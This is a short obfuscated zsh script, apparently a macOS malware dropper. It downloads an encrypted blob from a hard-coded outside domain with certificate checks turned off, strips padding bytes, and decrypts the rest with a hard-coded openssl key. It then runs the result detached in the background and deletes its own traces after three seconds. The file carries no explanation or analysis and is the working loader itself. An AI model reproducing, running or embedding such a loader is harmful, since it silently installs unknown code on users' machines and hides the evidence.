#!/bin/zsh
sr58u=$(mktemp /tmp/bxrkjr.XXXXXX)
curl -kfsSL "https://daisoftwarelimited.com/fd8a70f7f5c848a7ab6f2fea13d547ca/m622328383e6fe03b.bin" -o "$sr58uz" || exit 1
qvqbug=$(stat -f %z "$sr58uz"); jqgrfd6=$(( qvqbug - 2475 - 2955 ))
tail -c +$(( 2475 + 1 )) "$sr58uz" | head -c $jqgrfd6 | openssl enc -d -aes-256-cbc -k 654c1315b6b50e0daa7b8d03 -out "$sr58u" 2>/dev/null
[ -s "$sr58u" ] && chmod 700 "$sr58u" && ( "$sr58u" & ) && disown
( sleep 3; rm -f "$sr58u" "$sr58uz" ) &>/dev/null &
